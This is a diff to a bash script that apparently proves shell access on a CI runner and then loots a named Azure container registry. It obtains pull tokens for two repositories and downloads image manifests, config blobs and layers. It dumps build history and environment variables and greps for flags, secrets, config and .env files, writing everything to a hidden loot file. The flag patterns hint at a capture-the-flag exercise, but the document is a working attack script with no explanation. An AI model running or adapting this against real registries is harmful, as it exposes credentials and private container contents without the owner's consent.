@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
 set -uo pipefail
 echo "=== RUNNER SHELL PROOF ==="; id; hostname
-b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
 ACR=crtblplatprodx3euoz.azurecr.io
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
@@ -10,29 +9,23 @@ ACC='application/vnd.oci.image.index.v1+json, application/vnd.docker.distributio
 for R in catalog-api tebamoto-reporting-api; do
   say "############ REPO $R"
   T=$(curl -sS "${SC}${ACR}/oauth2/token?service=${ACR}&scope=repository:${R}:pull" | jq -r '.access_token // empty')
-  say "TOK ${T:0:8}"
-  say "TAGS: $(curl -sS -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/tags/list")"
-  for TAG in $(curl -sS -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/tags/list" | jq -r '.tags[]? // empty'); do
-    say "---- $R:$TAG ----"
-    M=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${TAG}")
-    say "MANIFEST: $(echo "$M" | head -c 1200)"
-    DIGESTS=$(echo "$M" | jq -r '.manifests[]?.digest // empty')
-    if [ -n "$DIGESTS" ]; then
-      for D in $DIGESTS; do
-        say "CHILD $D: $(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${D}" | head -c 1500)"
-      done
-    fi
-    LAYERS=$(echo "$M" | jq -r '.layers[]?.digest // empty')
-    CFG=$(echo "$M" | jq -r '.config.digest // empty')
-    if [ -n "$CFG" ]; then
-      say "CONFIG: $(curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${CFG}" | head -c 3000)"
-    fi
-    for L in $LAYERS; do
-      say "LAYER $L:"
+  IDX=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/latest")
+  for CH in $(echo "$IDX" | jq -r '.manifests[]?|select(.platform.architecture=="amd64")|.digest'); do
+    CM=$(curl -sS -H "Authorization: Bearer $T" -H "Accept: $ACC" "${SC}${ACR}/v2/${R}/manifests/${CH}")
+    CFG=$(echo "$CM" | jq -r '.config.digest // empty')
+    say "==== $R CONFIG $CFG ===="
+    curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${CFG}" -o /tmp/cfg.json
+    say "CFG-SIZE=$(wc -c </tmp/cfg.json)"
+    say "$(grep -aoE 'flag\{[^}]{0,160}\}|FLAG\{[^}]{0,160}\}' /tmp/cfg.json | head)"
+    say "CFG-HISTORY: $(jq -c '[.history[]?.created_by]' /tmp/cfg.json 2>/dev/null | head -c 2000)"
+    say "CFG-ENV: $(jq -c '.config.Env // .config.env // []' /tmp/cfg.json 2>/dev/null | head -c 2000)"
+    for L in $(echo "$CM" | jq -r '.layers[]?.digest'); do
       curl -sSL -H "Authorization: Bearer $T" "${SC}${ACR}/v2/${R}/blobs/${L}" -o /tmp/L.tgz
-      say "  size=$(wc -c </tmp/L.tgz)"
-      tar -tzf /tmp/L.tgz 2>/dev/null | head -40 | sed 's/^/  f: /'
-      tar -xzf /tmp/L.tgz -O 2>/dev/null | grep -aioE 'flag\{[^}]{0,120}\}|FLAG\{[^}]{0,120}\}|flag[=: "][^ "]{0,120}' | head -20 | sed 's/^/  HIT: /'
+      SZ=$(wc -c </tmp/L.tgz)
+      say "---- LAYER $L size=$SZ ----"
+      if [ "$SZ" -lt 4000 ]; then say "  RAW: $(cat /tmp/L.tgz | tr -d '\000' | head -c 1200)"; fi
+      tar -tzf /tmp/L.tgz 2>/dev/null | grep -iE 'flag|app\.py|config|secret|\.json$|\.env' | head -20 | sed 's/^/  f: /'
+      tar -xzf /tmp/L.tgz -O 2>/dev/null | grep -aoiE 'flag\{[^}]{0,160}\}|FLAG\{[^}]{0,160}\}|flag[=:_ "]{1,3}[A-Za-z0-9_{}.-]{4,120}' | head -20 | sed 's/^/  HIT: /'
     done
   done
 done
